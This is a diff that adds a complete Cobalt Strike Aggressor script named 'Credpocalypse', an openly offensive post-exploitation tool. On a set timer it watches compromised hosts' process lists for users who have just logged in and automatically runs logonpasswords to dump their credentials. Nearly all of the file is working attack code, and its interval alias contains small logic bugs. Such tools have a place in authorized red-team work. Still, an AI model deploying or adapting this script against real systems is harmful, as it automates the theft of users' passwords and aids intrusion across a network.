@@ -1,0 +1,233 @@
+#### Credpocalypse ####
+## Monitor beacons and pick off users as they log in
+## Author: Alyssa (ramen0x3f)
+## Last Updated: 2017-08-14
+
+## Description: ##
+# Automate dumping passwords, so you don't miss new users logging in.
+# Set the time interval (default 5m) and Credpocalypse will watch your
+# beacons for new users in the running processes. If they aren't in the
+# Credentials tab already, Credpocalypse will run logonpasswords.
+
+# NOTE: Your beacon will only be interrupted if logonpasswords is run.
+# There's no callback, so I can't smother the output. :-/ 
+
+## Usage: ##
+# Aliases
+# 	> begin_credpocalypse			- watch current beacon
+# 	> end_credpocalypse [all] 		- stop watching current/all beacon/s
+#	> credpocalypse_interval [time]	- 1m, 5m (default), 10m, 30m, 60m
+# 
+# Right click beacon(s) to get a pop up menu that lets you 
+# 	- Add to watchlist
+#	- Remove from watchlist
+#	- Change time interval that Credpocalypse checks watchlist
+#	- View the watchlist 
+
+######################################################################
+
+## Register Aliases: ##
+beacon_command_register("begin_credpocalypse", 
+	"Monitor beacons for new users and steal their passwords when they login",
+	"Synopsis: begin_credpocalypse", 
+	"Adds current beacon to watchlist and routinely checks for new users. When a user is in the process list but not the Credentials tab, credpocalypse runs logonpasswords on that beacon.");
+beacon_command_register("end_credpocalypse", 
+	"Stop monitoring beacons for new users",
+	"Synopsis: end_credpocalypse [all]", 
+	"If run without arguments, removes current beacon from watchlist. If 'all' is added, clears whole watchlist.");
+beacon_command_register("credpocalypse_interval", 
+	"Change the interval time for Credpocalypse checks",
+	"Synopsis: credpocalypse_interval [time]", 
+	"Options: 1m, 5m (default), 10m, 30m, 60m. If no time supplied, default is used.");
+
+global('@captured_creds @watchlist $interval');
+$interval = "5m";
+
+#########
+# UTILS #
+#########
+sub caps {
+	#Don't ask me how long it took to make this part work. 
+	#But uc breaks on backslashes. Also split. Really everything breaks. 
+	return join("\\", map({ return uc($1); }, split("\\\\", $1)));
+}
+
+sub get_users { 
+	bps($1, lambda({
+		local('$user $entry $extra $newuser');
+		$newuser = false;
+
+		foreach $entry (split("\n", $2)) {
+			($null, $null, $null, $null, $user) = split("\\s+", $entry);
+
+			$user = caps($user);
+			
+			if (($user cmp "NT") == 0 || ($user in @captured_creds) || strlen($user) == 0) { 
+				continue; #ignore NT accounts
+			}
+			else {
+				$newuser = true;
+				break;
+			}
+		}
+		[$callback: $1, $newuser];
+	}, $callback => $2));
+}
+
+sub steal_them_creds {
+	#Log what you're doing (this output shows in Script Console)
+	@pids = map({ return beacon_info($1, "pid"); }, @watchlist);
+	println("Looking for new users in PIDs: " . join(", ", @pids));
+
+	#Update creds list
+	clear(@captured_creds);
+	foreach %cred (credentials()) { #Add all the options 
+		push(@captured_creds, uc(%cred['realm']) . '\\' . uc(%cred['user']));
+	}
+
+	#Check each beacon for new users
+	foreach $bid (@watchlist) {
+		get_users($bid, {
+			if ( $2 ) {
+				println("New user! Running logonpasswords in " . beacon_info($1, "pid"));
+				blogonpasswords($1);
+			}
+			else {
+				println("No new users in " . beacon_info($1, "pid"));
+			}
+		});
+	}
+}
+
+####################
+# Menu and Aliases #
+####################
+alias begin_credpocalypse {
+	#Add all beacons to watchlist
+	if( $2 ) {
+		push(@watchlist, $2);
+	}
+	#Add current beacon to watchlist
+	else {
+		push(@watchlist, $1);
+	}
+}
+
+alias end_credpocalypse {
+	if ((lc($2) cmp "all") == 0) {
+		clear(@watchlist);
+	}
+	else {
+		pop(@watchlist, $1);
+	}
+}
+
+alias credpocalypse_interval {
+	if ( lc($2) cmp "1m" ) {
+		$interval = "1m";
+	}
+	else if ( lc($2) cmp "10m" ) {
+		$interval = "10m";
+	}
+	else if ( lc($2) cmp "10m" ) {
+		$interval = "30m";
+	}
+	else if ( lc($2) cmp "60m" ) {
+		$interval = "60m";
+	}
+	else {
+		$interval = "5m";
+	}
+	blog($1, "Updated interval to " . $interval);
+}
+
+popup beacon_bottom {
+	menu "Credpocalypse" {
+		item "Begin..." {
+			addAll(@watchlist, $1);
+
+			#Update the user
+			@pids = map({ return beacon_info($1, "pid"); }, $1);
+			show_message("Added to watchlist: " . join(", ", @pids));
+		}
+
+		item "End..." {
+			removeAll(@watchlist, $1);
+			
+			#Update the user
+			@pids = map({ return beacon_info($1, "pid"); }, $1);
+			show_message("Removed from watchlist: " . join(", ", @pids));
+		}
+
+		menu "Change Interval" {
+			item "1 minute" {
+				$interval = "1m";
+				println("New interval: " . $interval);
+			}
+
+			item "5 minutes" {
+				$interval = "5m";
+				println("New interval: " . $interval);
+			}
+
+			item "10 minutes" {
+				$interval = "10m";
+				println("New interval: " . $interval);
+			}
+
+			item "30 minutes" {
+				$interval = "30m";
+				println("New interval: " . $interval);
+			}
+
+			item "1 hour" {
+				$interval = "60m";
+				println("New interval: " . $interval);
+			}
+		}
+
+		item "View Watchlist" {
+			$list = "Watched Beacons:\n============";
+
+			foreach $bid (@watchlist) {
+				$list .= "\n" . beacon_info($bid, "internal") . " (pid " . beacon_info($bid, "pid") . ")";
+			}
+			
+			#Update the user
+			show_message($list);
+		}
+	}
+}
+
+##########
+# EVENTS #
+##########
+on heartbeat_1m {
+	if ( size(@watchlist) > 0 && ($interval cmp "1m") == 0) {
+		steal_them_creds();
+	}
+}
+
+on heartbeat_5m {
+	if ( size(@watchlist) > 0 && ($interval cmp "5m") == 0) {
+		steal_them_creds();
+	}
+}
+
+on heartbeat_10m {
+	if ( size(@watchlist) > 0 && ($interval cmp "10m") == 0) {
+		steal_them_creds();
+	}
+}
+
+on heartbeat_30m {
+	if ( size(@watchlist) > 0 && ($interval cmp "30m") == 0) {
+		steal_them_creds();
+	}
+}
+
+on heartbeat_60m {
+	if ( size(@watchlist) > 0 && ($interval cmp "60m") == 0) {
+		steal_them_creds();
+	}
+}
